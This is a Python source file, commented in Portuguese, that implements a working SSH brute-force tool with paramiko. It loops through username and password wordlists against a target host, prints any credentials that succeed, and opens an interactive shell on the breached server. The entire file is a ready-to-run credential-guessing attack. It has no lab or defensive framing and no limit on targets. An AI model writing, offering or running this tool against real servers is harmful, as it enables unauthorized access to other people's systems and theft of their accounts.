import paramiko
import sys
import select
import tty
import termios


def sshbrute():
    """
    Executa um brute force SSH
    """
    def obter_atributos_terminal():
        # Salva os atributos do terminal atual
        fd = sys.stdin.fileno()
        attributes = termios.tcgetattr(fd)
        return fd, attributes

    def configurar_atributos_terminal(fd, attributes):
        # Restaura os atributos do terminal
        termios.tcsetattr(fd, termios.TCSADRAIN, attributes)

    def shell_interativa(chan):
        # Configura o terminal para o modo não canônico (raw) para permitir a entrada interativa
        fd, antigos_atributos = obter_atributos_terminal()
        tty.setraw(fd)
        
        try:
            while True:
                # Verifica se há dados de entrada disponíveis no stdin e no canal SSH
                r, w, e = select.select([sys.stdin, chan], [], [])
                
                if sys.stdin in r:
                    # Lê a entrada do usuário do stdin
                    x = sys.stdin.read(1)
                    
                    if len(x) == 0:
                        break  # Sai ao receber EOF (por exemplo, pressionando Ctrl+D)
                    
                    # Envia o caractere lido para o servidor SSH
                    chan.send(x)
                
                if chan in r:
                    # Recebe dados do servidor SSH e exibe no stdout
                    x = chan.recv(1024)
                    
                    if len(x) == 0:
                        break
                    
                    sys.stdout.write(x.decode("utf-8"))
                    sys.stdout.flush()
        
        finally:
            # Restaura os atributos do terminal antes de sair
            configurar_atributos_terminal(fd, antigos_atributos)

    def conectar_ssh(hostname, username, senha):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(hostname, username=username, password=senha)
            print("Conexão SSH estabelecida com sucesso!")
            
            # Abre um canal SSH
            chan = client.invoke_shell()
            
            # Executa uma shell interativa
            shell_interativa(chan)
            
            # Encerra a conexão SSH
            chan.close()
            client.close()
            print("Conexão SSH encerrada.")
            return True
        except paramiko.AuthenticationException:
            print(f"[*] Acesso negado para {username}:{senha} [*]")
        except paramiko.SSHException as error:
            # print("Erro na conexão SSH: ", str(error))
            pass
        # except paramiko.Exception as error:
        #     print("Erro desconhecido: ", str(error))
        
        return False

    hostname = None
    username = None
    senha = None
    lista_senhas = []
    lista_usuarios = []

    # Analisa os argumentos da linha de comando
    i = 1
    while i < len(sys.argv):
        if sys.argv[i] == '-p':
            senha = sys.argv[i + 1]
            i += 1
        elif sys.argv[i] == '-wp':
            with open(sys.argv[i + 1], 'r', encoding='utf-8') as arquivo:
                lista_senhas = arquivo.read().splitlines()
            i += 1
        elif sys.argv[i] == '-u':
            username = sys.argv[i + 1]
            i += 1
        elif sys.argv[i] == '-wu':
            with open(sys.argv[i + 1], 'r', encoding='utf-8') as arquivo:
                lista_usuarios = arquivo.read().splitlines()
            i += 1
        elif sys.argv[i] == '-h':
            hostname = sys.argv[i + 1]
            i += 1
        i += 1
    
    # Verifica se todos os parâmetros necessários foram fornecidos
    if hostname is None or (username is None and len(lista_usuarios) == 0):
        #print("Uso: python ssh_client.py -h hostname [-u username | -wu wordlist_usuarios] [-p senha | -wp wordlist_senhas]")
        sys.exit(1)
    
    if lista_usuarios:  # Se a wordlist de usuários foi fornecida
        for usuario in lista_usuarios:
            if lista_senhas:  # Se a wordlist de senhas foi fornecida
                for senha in lista_senhas:
                    if conectar_ssh(hostname, usuario, senha):
                        print("Credenciais corretas encontradas:")
                        print("Usuário:", usuario)
                        print("Senha:", senha)
                        break
                else:
                    continue
                break
            elif senha:  # Se a senha foi fornecida
                if conectar_ssh(hostname, usuario, senha):
                    print("Credenciais corretas encontradas:")
                    print("Usuário:", usuario)
                    print("Senha:", senha)
                    break
        else:
            print("Nenhuma combinação correta de usuário e senha encontrada nas wordlists.")
    elif username:  # Se o usuário foi fornecido
        if lista_senhas:  # Se a wordlist de senhas foi fornecida
            for senha in lista_senhas:
                if conectar_ssh(hostname, username, senha):
                    print("Credenciais corretas encontradas:")
                    print("Usuário:", username)
                    print("Senha:", senha)
                    break
            else:
                print("Nenhuma senha correta encontrada na wordlist.")
        elif senha:  # Se a senha foi fornecida
            conectar_ssh(hostname, username, senha)
        else:
            print("Uma senha ou uma wordlist de senhas deve ser fornecida.")

